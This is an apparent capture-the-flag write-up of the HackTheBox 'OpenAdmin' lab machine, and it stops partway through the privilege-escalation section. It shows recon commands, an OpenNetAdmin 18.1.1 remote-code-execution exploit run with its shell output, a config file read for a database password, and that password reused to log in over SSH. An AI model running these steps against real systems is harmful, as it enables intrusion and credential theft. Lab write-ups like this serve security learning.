@@ -1,0 +1,327 @@
+<!doctype html><html lang=en><head><title>[HTB Writeup]: Openadmin HackTheBox Challenge :: Foxtrotlabs — In the middle of somewhere</title>
+<meta charset=utf-8><meta name=viewport content="width=device-width,initial-scale=1"><meta name=description content="&amp;lt;disclaimer&amp;gt;this is an old post, that was finished some time ago (February 2020), but due to the things (I forgot about retiring the machine) I&amp;rsquo;m publishing it now&amp;lt;/disclaimer&amp;gt;
+It&amp;rsquo;s been a looooong time&amp;hellip; &amp;hellip; since I&amp;rsquo;ve written something here. This place is not dead yet. I had really tight schedule with my security job, school, CTFs and PozSec meetups organization soooo it was really hard to start blogging again. I&amp;rsquo;m still learning so some topics I want to cover in depth require some time."><meta name=keywords content="hacking"><meta name=robots content="noodp"><link rel=canonical href=https://foxtrotlabs.cc/en/posts/2020-08-21-htb-writeup-openadmin/><script>var doNotTrack=!1;doNotTrack||(function(e,t,n,s,o,i,a){e.GoogleAnalyticsObject=o,e[o]=e[o]||function(){(e[o].q=e[o].q||[]).push(arguments)},e[o].l=1*new Date,i=t.createElement(n),a=t.getElementsByTagName(n)[0],i.async=1,i.src=s,a.parentNode.insertBefore(i,a)}(window,document,"script","https://www.google-analytics.com/analytics.js","ga"),ga("create","UA-148414315-1","auto"),ga("send","pageview"))</script><link rel=stylesheet href=https://foxtrotlabs.cc/assets/style.css><link rel=stylesheet href=https://foxtrotlabs.cc/assets/blue.css><link rel=apple-touch-icon-precomposed sizes=144x144 href=https://foxtrotlabs.cc/img/apple-touch-icon-144-precomposed.png><link rel="shortcut icon" href=https://foxtrotlabs.cc/avatar/favicon.ico><meta name=twitter:card content="summary"><meta name=twitter:creator content="foxtrot_0xf4ult"><meta property="og:locale" content="en"><meta property="og:type" content="article"><meta property="og:title" content="[HTB Writeup]: Openadmin HackTheBox Challenge :: Foxtrotlabs"><meta property="og:description" content="My attempt to solve OpenAdmin HTB box."><meta property="og:url" content="https://foxtrotlabs.cc/en/posts/2020-08-21-htb-writeup-openadmin/"><meta property="og:site_name" content="[HTB Writeup]: Openadmin HackTheBox Challenge"><meta property="og:image" content="https://foxtrotlabs.cc/2020/08/htb-writeup-openadmin-hackthebox-challenge/cover.png"><meta property="og:image:width" content="2048"><meta property="og:image:height" content="1024"><meta property="article:published_time" content="2020-08-21 17:54:54 +0100 +0100"></head><body><div class="container center headings--one-size"><header class=header><div class=header__inner><div class=header__logo><a href=https://foxtrotlabs.cc/en><div class=logo>foxtrotlabs-en</div></a></div><div class=menu-trigger>menu</div></div><nav class=menu><ul class="menu__inner menu__inner--desktop"><li><a href=https://foxtrotlabs.cc/posts>posts</a></li><li><a href=https://foxtrotlabs.cc/pl>Polish side</a></li><li><a href=https://foxtrotlabs.cc/about>about</a></li><li><a href=https://github.com/s3gm3nt4ti0nf4ult>github</a></li></ul><ul class="menu__inner menu__inner--mobile"><li><a href=https://foxtrotlabs.cc/posts>posts</a></li><li><a href=https://foxtrotlabs.cc/pl>Polish side</a></li><li><a href=https://foxtrotlabs.cc/about>about</a></li><li><a href=https://github.com/s3gm3nt4ti0nf4ult>github</a></li></ul></nav><script>var doNotTrack=!1;doNotTrack||(function(e,t,n,s,o,i,a){e.GoogleAnalyticsObject=o,e[o]=e[o]||function(){(e[o].q=e[o].q||[]).push(arguments)},e[o].l=1*new Date,i=t.createElement(n),a=t.getElementsByTagName(n)[0],i.async=1,i.src=s,a.parentNode.insertBefore(i,a)}(window,document,"script","https://www.google-analytics.com/analytics.js","ga"),ga("create","UA-148414315-1","auto"),ga("send","pageview"))</script></header><div class=content><div class=post><h1 class=post-title><a href=https://foxtrotlabs.cc/en/posts/2020-08-21-htb-writeup-openadmin/>[HTB Writeup]: Openadmin HackTheBox Challenge</a></h1><div class=post-meta><span class=post-date>2020-08-21
+</span><span class=post-author>::
+foxtrot_charlie</span></div><span class=post-tags>#<a href=https://foxtrotlabs.cc/tags/hacking/>hacking</a>&nbsp;
+#<a href=https://foxtrotlabs.cc/tags/htb/>htb</a>&nbsp;
+#<a href=https://foxtrotlabs.cc/tags/hackthebox/>hackthebox</a>&nbsp;
+#<a href=https://foxtrotlabs.cc/tags/openadmin/>openadmin</a>&nbsp;
+#<a href=https://foxtrotlabs.cc/tags/opennetadmin/>opennetadmin</a>&nbsp;
+#<a href=https://foxtrotlabs.cc/tags/pentestingstuff/>pentestingstuff</a>&nbsp;
+</span><img src=https://foxtrotlabs.cc/2020/08/htb-writeup-openadmin-hackthebox-challenge/cover.png class=post-cover alt="[HTB Writeup]: Openadmin HackTheBox Challenge"><div class=table-of-contents><h2>Table of Contents</h2><nav id=TableOfContents><ul><li><ul><li><a href=#its-been-a-looooong-time>It&rsquo;s been a looooong time&mldr;</a></li><li><a href=#recon>Recon</a></li><li><a href=#stuck>Stuck</a></li><li><a href=#local-shell>Local shell</a></li><li><a href=#poking-around>Poking around</a></li><li><a href=#priviliage-escalation>Priviliage escalation</a></li><li><a href=#bottom-line>Bottom line</a></li></ul></li></ul></nav></div><div class=post-content><div><p><em><strong><code>&lt;disclaimer></code>this is an old post, that was finished some time ago (February 2020), but due to the things (I forgot about retiring the machine) I&rsquo;m publishing it now<code>&lt;/disclaimer></code></strong></em></p><h3 id=its-been-a-looooong-time>It&rsquo;s been a looooong time&mldr;<a href=#its-been-a-looooong-time class=hanchor arialabel=Anchor>&#8983;</a></h3><p>&mldr; since I&rsquo;ve written something here. This place is not dead yet. I had really tight schedule with my security job, school, CTFs and PozSec meetups organization soooo it was really hard to start blogging again. I&rsquo;m still learning so some topics I want to cover in depth require some time. But here I am with pretty easy challenge from HTB. It is my first HTB writeup and now I cannot wait to publish it! But I have to wait for the embargo to exceed.</p><p><img src=./card.png alt=card></p><h3 id=recon>Recon<a href=#recon class=hanchor arialabel=Anchor>&#8983;</a></h3><p>First things first. Box is located at <code>10.10.10.171</code> address. I&rsquo;ve added an entry to <code>/etc/hosts</code> to localize it by domain name.</p><pre tabindex=0><code>10.10.10.171	oneadmin.htb
+</code></pre><p>Nmap scan didn&rsquo;t show anything interesting:</p><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-bash data-lang=bash><span style=display:flex><span>sudo nmap -T aggressive -sC -sV  10.10.10.171 
+</span></span><span style=display:flex><span>Starting Nmap 7.80 <span style=color:#f92672>(</span> https://nmap.org <span style=color:#f92672>)</span> at 2020-02-21 01:32 CET
+</span></span><span style=display:flex><span>Nmap scan report <span style=color:#66d9ef>for</span> openadmin.htb <span style=color:#f92672>(</span>10.10.10.171<span style=color:#f92672>)</span>
+</span></span><span style=display:flex><span>Host is up <span style=color:#f92672>(</span>0.053s latency<span style=color:#f92672>)</span>.
+</span></span><span style=display:flex><span>Not shown: <span style=color:#ae81ff>998</span> closed ports
+</span></span><span style=display:flex><span>PORT   STATE SERVICE VERSION
+</span></span><span style=display:flex><span>22/tcp open  ssh     OpenSSH 7.6p1 Ubuntu 4ubuntu0.3 <span style=color:#f92672>(</span>Ubuntu Linux; protocol 2.0<span style=color:#f92672>)</span>
+</span></span><span style=display:flex><span>| ssh-hostkey: 
+</span></span><span style=display:flex><span>|   <span style=color:#ae81ff>2048</span> 4b:98:df:85:d1:7e:f0:3d:da:48:cd:bc:92:00:b7:54 <span style=color:#f92672>(</span>RSA<span style=color:#f92672>)</span>
+</span></span><span style=display:flex><span>|   <span style=color:#ae81ff>256</span> dc:eb:3d:c9:44:d1:18:b1:22:b4:cf:de:bd:6c:7a:54 <span style=color:#f92672>(</span>ECDSA<span style=color:#f92672>)</span>
+</span></span><span style=display:flex><span>|_  <span style=color:#ae81ff>256</span> dc:ad:ca:3c:11:31:5b:6f:e6:a4:89:34:7c:9b:e5:50 <span style=color:#f92672>(</span>ED25519<span style=color:#f92672>)</span>
+</span></span><span style=display:flex><span>80/tcp open  http    Apache httpd 2.4.29 <span style=color:#f92672>((</span>Ubuntu<span style=color:#f92672>))</span>
+</span></span><span style=display:flex><span>|_http-server-header: Apache/2.4.29 <span style=color:#f92672>(</span>Ubuntu<span style=color:#f92672>)</span>
+</span></span><span style=display:flex><span>|_http-title: Apache2 Ubuntu Default Page: It works
+</span></span><span style=display:flex><span>Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
+</span></span><span style=display:flex><span>
+</span></span><span style=display:flex><span>Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
+</span></span><span style=display:flex><span>Nmap <span style=color:#66d9ef>done</span>: <span style=color:#ae81ff>1</span> IP address <span style=color:#f92672>(</span><span style=color:#ae81ff>1</span> host up<span style=color:#f92672>)</span> scanned in 9.60 seconds
+</span></span></code></pre></div><p>Recon with <code>-p-</code> options gave nothing new. Standard ssh service and a single http server running on port 80. HTB is not about bruteforcing, so without initial foothold trying to leak users with <a href=https://www.exploit-db.com/exploits/45233>this</a> enumeration exploit is rather bad idea. Next part of the recon included running <code>gobuster</code> on <code>/</code> directory.</p><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-bash data-lang=bash><span style=display:flex><span> gobuster dir -u 10.10.10.171 -w wordlists/common.txt -t <span style=color:#ae81ff>30</span> -x .asp,.aspx,.bat,.c,.cfm,.cgi,.com,.dll,.exe,.htm,.html,.inc,.jhtml,.jsa,.jsp,.log,.mdb,.nsf,.php,.phtml,.pl,.reg,.sh,.shtml,.sql,.txt,.xml
+</span></span></code></pre></div><p>The tool has found some pages on the host:</p><pre tabindex=0><code>artwork
+music
+sierra
+</code></pre><p>And some forbidden_403_not_so_interesting_stuff (looked like rules to redirect all .htaccess etc.). Recursive search on given domains gave some files, but nothing particulary important.</p><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-bash data-lang=bash><span style=display:flex><span> gobuster dir -u 10.10.10.171/artwork -w wordlists/common.txt -t <span style=color:#ae81ff>30</span> -x .asp,.aspx,.bat,.c,.cfm,.cgi,.com,.dll,.exe,.htm,.html,.inc,.jhtml,.jsa,.jsp,.log,.mdb,.nsf,.php,.phtml,.pl,.reg,.sh,.shtml,.sql,.txt,
+</span></span></code></pre></div><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-bash data-lang=bash><span style=display:flex><span> gobuster dir -u 10.10.10.171/msuic -w wordlists/common.txt -t <span style=color:#ae81ff>30</span> -x .asp,.aspx,.bat,.c,.cfm,.cgi,.com,.dll,.exe,.htm,.html,.inc,.jhtml,.jsa,.jsp,.log,.mdb,.nsf,.php,.phtml,.pl,.reg,.sh,.shtml,.sql,.txt,.xml
+</span></span></code></pre></div><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-bash data-lang=bash><span style=display:flex><span> gobuster dir -u 10.10.10.171/sierra -w wordlists/common.txt -t <span style=color:#ae81ff>30</span> -x .asp,.aspx,.bat,.c,.cfm,.cgi,.com,.dll,.exe,.htm,.html,.inc,.jhtml,.jsa,.jsp,.log,.mdb,.nsf,.php,.phtml,.pl,.reg,.sh,.shtml,.sql,.txt,.xml
+</span></span></code></pre></div><p>At this point after analysis of the content of hosted files I had really hard time. Nothing to see here, but there must have be something&mldr;</p><p>In the meantime I&rsquo;ve tried to enum ssh users using <code>CVE-2018-15473</code>since <code>OpenSSH version 7.6p1</code> but that was the dead end with false positives only. After changing the method in <code>msf</code> no results were returned. Other tool also has failed.</p><h3 id=stuck>Stuck<a href=#stuck class=hanchor arialabel=Anchor>&#8983;</a></h3><p>Sometimes during the pentest it is really nice to have a collection of all hyperlinks on the website. Probably there will be something interesting. I&rsquo;ve written a simple and really fast crawler to achieve that. Here is the most important part of the generated report.</p><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-bash data-lang=bash><span style=display:flex><span><span style=color:#f92672>[</span>...<span style=color:#f92672>]</span>
+</span></span><span style=display:flex><span>
+</span></span><span style=display:flex><span><span style=color:#f92672>===</span> REPORT <span style=color:#f92672>===</span>
+</span></span><span style=display:flex><span><span style=color:#f92672>===</span> IN WEBSITE LINKS <span style=color:#f92672>===</span>
+</span></span><span style=display:flex><span>+-----------------------------------------+-----------------------------------------+
+</span></span><span style=display:flex><span>| source                                  | target                                  |
+</span></span><span style=display:flex><span>+<span style=color:#f92672>=========================================</span>+<span style=color:#f92672>=========================================</span>+
+</span></span><span style=display:flex><span>| http://10.10.10.171/music/contact.html  | http://10.10.10.171/music/blog.html     |
+</span></span><span style=display:flex><span>+-----------------------------------------+-----------------------------------------+
+</span></span><span style=display:flex><span>| http://10.10.10.171/music/playlist.html | http://10.10.10.171/music/blog.html     |
+</span></span><span style=display:flex><span>+-----------------------------------------+-----------------------------------------+
+</span></span><span style=display:flex><span>| http://10.10.10.171/music/artist.html   | http://10.10.10.171/music/category.html |
+</span></span><span style=display:flex><span>+-----------------------------------------+-----------------------------------------+
+</span></span><span style=display:flex><span>| http://10.10.10.171/music/index.html    | http://10.10.10.171/ona                 | &lt;- this entry
+</span></span><span style=display:flex><span>+-----------------------------------------+-----------------------------------------+
+</span></span><span style=display:flex><span>
+</span></span><span style=display:flex><span><span style=color:#f92672>[</span>...<span style=color:#f92672>]</span>
+</span></span></code></pre></div><p>It&rsquo;s really a pitty that this wasn&rsquo;t found by some popular wordlists for dirbusting. But well, yeah. Back on track.</p><h3 id=local-shell>Local shell<a href=#local-shell class=hanchor arialabel=Anchor>&#8983;</a></h3><p><code>/ona</code> redirected to OpenNetAdmin 18.1.1. The <a href=https://opennetadmin.com/>tool</a> for managing inventory of your network. This version is vulnerable and RCE and the PoC was published. Unfortunately the .sh script hasn&rsquo;t worked for me. Finally I&rsquo;ve found the right <a href=https://github.com/amriunix/ona-rce>exploit</a> which gave a really simple shell for www-data user.</p><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-bash data-lang=bash><span style=display:flex><span>&gt; python ona-rce.py exploit http://10.10.10.171/ona
+</span></span><span style=display:flex><span><span style=color:#f92672>[</span>*<span style=color:#f92672>]</span> OpenNetAdmin 18.1.1 - Remote Code Execution
+</span></span><span style=display:flex><span><span style=color:#f92672>[</span>+<span style=color:#f92672>]</span> Connecting !
+</span></span><span style=display:flex><span><span style=color:#f92672>[</span>+<span style=color:#f92672>]</span> Connected Successfully!
+</span></span><span style=display:flex><span>sh$ id
+</span></span><span style=display:flex><span>uid<span style=color:#f92672>=</span>33<span style=color:#f92672>(</span>www-data<span style=color:#f92672>)</span> gid<span style=color:#f92672>=</span>33<span style=color:#f92672>(</span>www-data<span style=color:#f92672>)</span> groups<span style=color:#f92672>=</span>33<span style=color:#f92672>(</span>www-data<span style=color:#f92672>)</span>
+</span></span><span style=display:flex><span>sh$
+</span></span></code></pre></div><h3 id=poking-around>Poking around<a href=#poking-around class=hanchor arialabel=Anchor>&#8983;</a></h3><p>Next stage of the enumeration involved looking around to obtain a real shell, probably ssh to the machine. At this time I&rsquo;ve decided not to create any type of more complicated shell with for example a python tty. Just looked around for available stuff.</p><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-bash data-lang=bash><span style=display:flex><span>sh$ ls -la
+</span></span><span style=display:flex><span>total <span style=color:#ae81ff>88</span>
+</span></span><span style=display:flex><span>drwxrwxr-x <span style=color:#ae81ff>10</span> www-data www-data  <span style=color:#ae81ff>4096</span> Feb <span style=color:#ae81ff>20</span> 20:33 .
+</span></span><span style=display:flex><span>drwxr-x---  <span style=color:#ae81ff>7</span> www-data www-data  <span style=color:#ae81ff>4096</span> Nov <span style=color:#ae81ff>21</span> 18:23 ..
+</span></span><span style=display:flex><span>-rw-rw-r--  <span style=color:#ae81ff>1</span> www-data www-data  <span style=color:#ae81ff>1970</span> Jan  <span style=color:#ae81ff>3</span>  <span style=color:#ae81ff>2018</span> .htaccess.example
+</span></span><span style=display:flex><span>-rw-r--r--  <span style=color:#ae81ff>1</span> www-data www-data <span style=color:#ae81ff>16384</span> Feb <span style=color:#ae81ff>20</span> 20:33 .login.php.swp
+</span></span><span style=display:flex><span>drwxrwxr-x  <span style=color:#ae81ff>2</span> www-data www-data  <span style=color:#ae81ff>4096</span> Jan  <span style=color:#ae81ff>3</span>  <span style=color:#ae81ff>2018</span> config
+</span></span><span style=display:flex><span>-rw-rw-r--  <span style=color:#ae81ff>1</span> www-data www-data  <span style=color:#ae81ff>1949</span> Jan  <span style=color:#ae81ff>3</span>  <span style=color:#ae81ff>2018</span> config_dnld.php
+</span></span><span style=display:flex><span>-rw-rw-r--  <span style=color:#ae81ff>1</span> www-data www-data  <span style=color:#ae81ff>4160</span> Jan  <span style=color:#ae81ff>3</span>  <span style=color:#ae81ff>2018</span> dcm.php
+</span></span><span style=display:flex><span>drwxrwxr-x  <span style=color:#ae81ff>3</span> www-data www-data  <span style=color:#ae81ff>4096</span> Jan  <span style=color:#ae81ff>3</span>  <span style=color:#ae81ff>2018</span> images
+</span></span><span style=display:flex><span>drwxrwxr-x  <span style=color:#ae81ff>9</span> www-data www-data  <span style=color:#ae81ff>4096</span> Jan  <span style=color:#ae81ff>3</span>  <span style=color:#ae81ff>2018</span> include
+</span></span><span style=display:flex><span>-rw-rw-r--  <span style=color:#ae81ff>1</span> www-data www-data  <span style=color:#ae81ff>1999</span> Jan  <span style=color:#ae81ff>3</span>  <span style=color:#ae81ff>2018</span> index.php
+</span></span><span style=display:flex><span>drwxrwxr-x  <span style=color:#ae81ff>5</span> www-data www-data  <span style=color:#ae81ff>4096</span> Jan  <span style=color:#ae81ff>3</span>  <span style=color:#ae81ff>2018</span> local
+</span></span><span style=display:flex><span>-rw-rw-r--  <span style=color:#ae81ff>1</span> www-data www-data  <span style=color:#ae81ff>4526</span> Jan  <span style=color:#ae81ff>3</span>  <span style=color:#ae81ff>2018</span> login.php
+</span></span><span style=display:flex><span>-rw-rw-r--  <span style=color:#ae81ff>1</span> www-data www-data  <span style=color:#ae81ff>1106</span> Jan  <span style=color:#ae81ff>3</span>  <span style=color:#ae81ff>2018</span> logout.php
+</span></span><span style=display:flex><span>drwxrwxr-x  <span style=color:#ae81ff>3</span> www-data www-data  <span style=color:#ae81ff>4096</span> Jan  <span style=color:#ae81ff>3</span>  <span style=color:#ae81ff>2018</span> modules
+</span></span><span style=display:flex><span>drwxrwxr-x  <span style=color:#ae81ff>3</span> www-data www-data  <span style=color:#ae81ff>4096</span> Jan  <span style=color:#ae81ff>3</span>  <span style=color:#ae81ff>2018</span> plugins
+</span></span><span style=display:flex><span>drwxrwxr-x  <span style=color:#ae81ff>2</span> www-data www-data  <span style=color:#ae81ff>4096</span> Jan  <span style=color:#ae81ff>3</span>  <span style=color:#ae81ff>2018</span> winc
+</span></span><span style=display:flex><span>drwxrwxr-x  <span style=color:#ae81ff>3</span> www-data www-data  <span style=color:#ae81ff>4096</span> Jan  <span style=color:#ae81ff>3</span>  <span style=color:#ae81ff>2018</span> workspace_plugins
+</span></span></code></pre></div><p>Grepping directiories and searching for the password redirected to the <code>local/config</code> directory.</p><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-bash data-lang=bash><span style=display:flex><span>sh$ ls -la local
+</span></span><span style=display:flex><span>total <span style=color:#ae81ff>20</span>
+</span></span><span style=display:flex><span>drwxrwxr-x  <span style=color:#ae81ff>5</span> www-data www-data <span style=color:#ae81ff>4096</span> Jan  <span style=color:#ae81ff>3</span>  <span style=color:#ae81ff>2018</span> .
+</span></span><span style=display:flex><span>drwxrwxr-x <span style=color:#ae81ff>10</span> www-data www-data <span style=color:#ae81ff>4096</span> Feb <span style=color:#ae81ff>20</span> 20:33 ..
+</span></span><span style=display:flex><span>drwxrwxr-x  <span style=color:#ae81ff>2</span> www-data www-data <span style=color:#ae81ff>4096</span> Nov <span style=color:#ae81ff>21</span> 16:51 config
+</span></span><span style=display:flex><span>drwxrwxr-x  <span style=color:#ae81ff>3</span> www-data www-data <span style=color:#ae81ff>4096</span> Jan  <span style=color:#ae81ff>3</span>  <span style=color:#ae81ff>2018</span> nmap_scans
+</span></span><span style=display:flex><span>drwxrwxr-x  <span style=color:#ae81ff>2</span> www-data www-data <span style=color:#ae81ff>4096</span> Jan  <span style=color:#ae81ff>3</span>  <span style=color:#ae81ff>2018</span> plugins
+</span></span></code></pre></div><p>With <code>database_settings.inc.php</code> in it.</p><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-bash data-lang=bash><span style=display:flex><span>sh$ ls -la local/config
+</span></span><span style=display:flex><span>total <span style=color:#ae81ff>16</span>
+</span></span><span style=display:flex><span>drwxrwxr-x <span style=color:#ae81ff>2</span> www-data www-data <span style=color:#ae81ff>4096</span> Nov <span style=color:#ae81ff>21</span> 16:51 .
+</span></span><span style=display:flex><span>drwxrwxr-x <span style=color:#ae81ff>5</span> www-data www-data <span style=color:#ae81ff>4096</span> Jan  <span style=color:#ae81ff>3</span>  <span style=color:#ae81ff>2018</span> ..
+</span></span><span style=display:flex><span>-rw-r--r-- <span style=color:#ae81ff>1</span> www-data www-data  <span style=color:#ae81ff>426</span> Nov <span style=color:#ae81ff>21</span> 16:51 database_settings.inc.php
+</span></span><span style=display:flex><span>-rw-rw-r-- <span style=color:#ae81ff>1</span> www-data www-data <span style=color:#ae81ff>1201</span> Jan  <span style=color:#ae81ff>3</span>  <span style=color:#ae81ff>2018</span> motd.txt.example
+</span></span><span style=display:flex><span>-rw-r--r-- <span style=color:#ae81ff>1</span> www-data www-data    <span style=color:#ae81ff>0</span> Nov <span style=color:#ae81ff>21</span> 16:28 run_installer
+</span></span></code></pre></div><p>Further look at that file gave some really interesting results.</p><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-bash data-lang=bash><span style=display:flex><span>sh$ cat local/config/database_settings.inc.php
+</span></span></code></pre></div><p><strong>MySQL creds laying on the ground.</strong></p><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-php data-lang=php><span style=display:flex><span>[<span style=color:#f92672>...</span>]
+</span></span><span style=display:flex><span>    <span style=color:#e6db74>&#39;databases&#39;</span> <span style=color:#f92672>=&gt;</span> 
+</span></span><span style=display:flex><span>    <span style=color:#66d9ef>array</span> (
+</span></span><span style=display:flex><span>      <span style=color:#ae81ff>0</span> <span style=color:#f92672>=&gt;</span> 
+</span></span><span style=display:flex><span>      <span style=color:#66d9ef>array</span> (
+</span></span><span style=display:flex><span>        <span style=color:#e6db74>&#39;db_type&#39;</span> <span style=color:#f92672>=&gt;</span> <span style=color:#e6db74>&#39;mysqli&#39;</span>,
+</span></span><span style=display:flex><span>        <span style=color:#e6db74>&#39;db_host&#39;</span> <span style=color:#f92672>=&gt;</span> <span style=color:#e6db74>&#39;localhost&#39;</span>,
+</span></span><span style=display:flex><span>        <span style=color:#e6db74>&#39;db_login&#39;</span> <span style=color:#f92672>=&gt;</span> <span style=color:#e6db74>&#39;ona_sys&#39;</span>,
+</span></span><span style=display:flex><span>        <span style=color:#e6db74>&#39;db_passwd&#39;</span> <span style=color:#f92672>=&gt;</span> <span style=color:#e6db74>&#39;n1nj4W4rri0R!&#39;</span>,
+</span></span><span style=display:flex><span>        <span style=color:#e6db74>&#39;db_database&#39;</span> <span style=color:#f92672>=&gt;</span> <span style=color:#e6db74>&#39;ona_default&#39;</span>,
+</span></span><span style=display:flex><span>        <span style=color:#e6db74>&#39;db_debug&#39;</span> <span style=color:#f92672>=&gt;</span> <span style=color:#66d9ef>false</span>,
+</span></span><span style=display:flex><span>
+</span></span><span style=display:flex><span>[<span style=color:#f92672>...</span>]
+</span></span><span style=display:flex><span>))
+</span></span></code></pre></div><p>I&rsquo;ve tried listing users on the box. I did it simply by checking the <code>home</code> directory on the host.</p><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-bash data-lang=bash><span style=display:flex><span>sh$ ls -la /home
+</span></span><span style=display:flex><span>total <span style=color:#ae81ff>16</span>
+</span></span><span style=display:flex><span>drwxr-xr-x  <span style=color:#ae81ff>4</span> root   root   <span style=color:#ae81ff>4096</span> Nov <span style=color:#ae81ff>22</span> 18:00 .
+</span></span><span style=display:flex><span>drwxr-xr-x <span style=color:#ae81ff>24</span> root   root   <span style=color:#ae81ff>4096</span> Nov <span style=color:#ae81ff>21</span> 13:41 ..
+</span></span><span style=display:flex><span>drwxr-x---  <span style=color:#ae81ff>5</span> jimmy  jimmy  <span style=color:#ae81ff>4096</span> Nov <span style=color:#ae81ff>22</span> 23:15 jimmy
+</span></span><span style=display:flex><span>drwxr-x---  <span style=color:#ae81ff>6</span> joanna joanna <span style=color:#ae81ff>4096</span> Nov <span style=color:#ae81ff>28</span> 09:37 joanna
+</span></span></code></pre></div><p>Attempted to do some kind of password spraying attack. Got three accounts on the host (with root), one password and after one try, I&rsquo;ve managed to login! Remember users never ever reuse your passwords.</p><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-bash data-lang=bash><span style=display:flex><span>ssh jimmy@10.10.10.171 
+</span></span><span style=display:flex><span>jimmy@10.10.10.171<span style=color:#960050;background-color:#1e0010>&#39;</span>s password: n1nj4W4rri0R!
+</span></span><span style=display:flex><span>Welcome to Ubuntu 18.04.3 LTS <span style=color:#f92672>(</span>GNU/Linux 4.15.0-70-generic x86_64<span style=color:#f92672>)</span>
+</span></span><span style=display:flex><span>
+</span></span><span style=display:flex><span> * Documentation:  https://help.ubuntu.com
+</span></span><span style=display:flex><span> * Management:     https://landscape.canonical.com
+</span></span><span style=display:flex><span> * Support:        https://ubuntu.com/advantage
+</span></span><span style=display:flex><span>
+</span></span><span style=display:flex><span>  System information as of Thu Feb <span style=color:#ae81ff>20</span> 20:53:53 UTC <span style=color:#ae81ff>2020</span>
+</span></span><span style=display:flex><span>
+</span></span><span style=display:flex><span>  System load:  0.24              Processes:             <span style=color:#ae81ff>118</span>
+</span></span><span style=display:flex><span>  Usage of /:   50.8% of 7.81GB   Users logged in:       <span style=color:#ae81ff>0</span>
+</span></span><span style=display:flex><span>  Memory usage: 27%               IP address <span style=color:#66d9ef>for</span> ens160: 10.10.10.171
+</span></span><span style=display:flex><span>  Swap usage:   0%
+</span></span><span style=display:flex><span>
+</span></span><span style=display:flex><span>
+</span></span><span style=display:flex><span> * Canonical Livepatch is available <span style=color:#66d9ef>for</span> installation.
+</span></span><span style=display:flex><span>   - Reduce system reboots and improve kernel security. Activate at:
+</span></span><span style=display:flex><span>     https://ubuntu.com/livepatch
+</span></span><span style=display:flex><span>
+</span></span><span style=display:flex><span><span style=color:#ae81ff>41</span> packages can be updated.
+</span></span><span style=display:flex><span><span style=color:#ae81ff>12</span> updates are security updates.
+</span></span><span style=display:flex><span>
+</span></span><span style=display:flex><span>Last login: Thu Jan  <span style=color:#ae81ff>2</span> 20:50:03 <span style=color:#ae81ff>2020</span> from 10.10.14.3
+</span></span><span style=display:flex><span>jimmy@openadmin:~$ ls
+</span></span></code></pre></div><p>Looked like the first shell had been spawned. But no <code>user.txt</code> file was there. Needed to look deeper [meme].</p><h3 id=priviliage-escalation>Priviliage escalation<a href=#priviliage-escalation class=hanchor arialabel=Anchor>&#8983;</a></h3><p>It was time to do some priv esc. Firstly to obtain access to <code>joanna</code> home directory, then root.</p><h4 id=horizontal>Horizontal<a href=#horizontal class=hanchor arialabel=Anchor>&#8983;</a></h4><p>In general there are two types of priviliage escalation. Horizontal means trying to get another users that are not <code>power users</code> like root. But they may belong to different groups and have read and write rights to some interesting locations. My obvious choice was to target joanna&rsquo;s account.</p><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-bash data-lang=bash><span style=display:flex><span>jimmy@openadmin:~$ ls -la
+</span></span><span style=display:flex><span>total <span style=color:#ae81ff>32</span>
+</span></span><span style=display:flex><span>drwxr-x--- <span style=color:#ae81ff>5</span> jimmy jimmy <span style=color:#ae81ff>4096</span> Nov <span style=color:#ae81ff>22</span> 23:15 .
+</span></span><span style=display:flex><span>drwxr-xr-x <span style=color:#ae81ff>4</span> root  root  <span style=color:#ae81ff>4096</span> Nov <span style=color:#ae81ff>22</span> 18:00 ..
+</span></span><span style=display:flex><span>lrwxrwxrwx <span style=color:#ae81ff>1</span> jimmy jimmy    <span style=color:#ae81ff>9</span> Nov <span style=color:#ae81ff>21</span> 14:07 .bash_history -&gt; /dev/null
+</span></span><span style=display:flex><span>-rw-r--r-- <span style=color:#ae81ff>1</span> jimmy jimmy  <span style=color:#ae81ff>220</span> Apr  <span style=color:#ae81ff>4</span>  <span style=color:#ae81ff>2018</span> .bash_logout
+</span></span><span style=display:flex><span>-rw-r--r-- <span style=color:#ae81ff>1</span> jimmy jimmy <span style=color:#ae81ff>3771</span> Apr  <span style=color:#ae81ff>4</span>  <span style=color:#ae81ff>2018</span> .bashrc
+</span></span><span style=display:flex><span>drwx------ <span style=color:#ae81ff>2</span> jimmy jimmy <span style=color:#ae81ff>4096</span> Nov <span style=color:#ae81ff>21</span> 13:52 .cache
